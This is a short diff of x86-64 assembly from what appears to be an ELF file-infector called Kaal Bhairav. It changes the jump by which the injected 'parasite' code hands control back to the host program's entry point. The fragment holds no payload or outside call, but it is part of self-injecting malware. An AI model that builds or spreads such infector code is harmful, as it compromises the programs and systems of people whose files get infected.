@@ -159,4 +159,4 @@ address_loaded_in_RBX:
 	; RBX contains the base address (where the program is loaded in memory), adding the offset of
 	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
 	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
-	jmp	r8
+	jmp	_start
